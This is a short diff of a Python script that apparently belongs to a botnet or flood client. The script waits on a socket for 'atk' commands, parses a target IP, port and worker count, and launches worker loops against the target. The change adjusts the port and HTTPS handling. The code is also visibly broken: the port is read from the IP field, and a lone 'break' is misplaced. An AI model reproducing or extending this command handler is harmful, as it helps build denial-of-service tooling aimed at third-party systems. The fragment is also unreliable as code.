@@ -24,10 +24,9 @@ while True and s:
     data = data.decode('utf-8').replace("\r\n", "")
     if data.startswith("atk"):
         ip = data.split(" ")[1]
-        is_https = True if "https" in ip else False
-        port = 80 if len(data.split(" ")) < 2 and not is_https else 80 if is_https and len(data.split(" ")) < 2 else data.split(" ")[1]
+        port = None if len(data.split(" ")) < 2 else data.split(" ")[1]
         workers = DEFAULT_WORKERS if len(data.split(" ")) < 3 else data.split(" ")[2]
-
+        is_https = True if "https" in ip else False
         
             break
         for i in range(workers + 1):
